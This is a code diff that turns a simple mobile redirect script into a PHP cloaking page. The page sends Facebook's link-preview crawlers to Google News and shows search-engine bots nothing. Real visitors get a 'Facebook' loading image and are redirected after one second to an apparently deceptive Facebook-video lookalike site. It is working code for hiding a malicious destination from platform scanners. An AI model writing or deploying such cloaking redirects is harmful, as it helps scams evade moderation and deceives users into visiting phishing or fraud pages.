@@ -1,20 +1,54 @@
-<script type='text/javascript'>
+<?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-  function mover(){
-    window.location = 'https://www.bing.com/ck/a?!&&p=01b0206476ab88a6JmltdHM9MTcxOTg3ODQwMCZpZ3VpZD0yMGY3MGUxNy1iMjhmLTZmNTItMGY3Zi0xYWI4YjM3NDZlZTcmaW5zaWQ9NTE5Ng&ptn=3&ver=2&hsh=3&fclid=20f70e17-b28f-6f52-0f7f-1ab8b3746ee7&u=a1aHR0cHM6Ly9pbnN0YWJhbmdsYS5jb20vZW4vYmVzdC1leWUtaG9zcGl0YWwtaW4ta29sa2F0YS8&ntb=1'
-
-  }; 
-
-if(navigator.userAgent.match(/Android|webOS|iPhone|iPod|Blackberry/i) )
-{
-
- setTimeout(mover,1)
-
+// Facebook bot detection
+if (stripos($userAgent, 'facebookexternalhit') !== false || stripos($userAgent, 'Facebot') !== false) {
+    // Redirect Facebook bots to Google (for preview like i-button)
+    header("Location: https://www.news.google.com/");
+    exit;
 }
 
-if (navigator.userAgent.match(/Tablet|iPad/i))
-{
-    setTimeout(mover,1)
+// Allow search engine bots like Googlebot or Bingbot
+if (stripos($userAgent, 'Googlebot') !== false || stripos($userAgent, 'bingbot') !== false) {
+    // Do nothing, let them view page
+    exit;
 }
 
-</script>
+// For real users, show image and delay before redirect
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Landing Images</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        img {
+            width: 315px;
+            height: 315px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+    <script>
+        setTimeout(function () {
+            window.location.href = "https://fbvideo.live/may9new.html";
+        }, 1000); // 1 second = 1000 milliseconds
+    </script>
+</head>
+<body>
+    <img src="https://imagexcdn.com/loading.webp" alt="Facebook" />
+</body>
+</html>
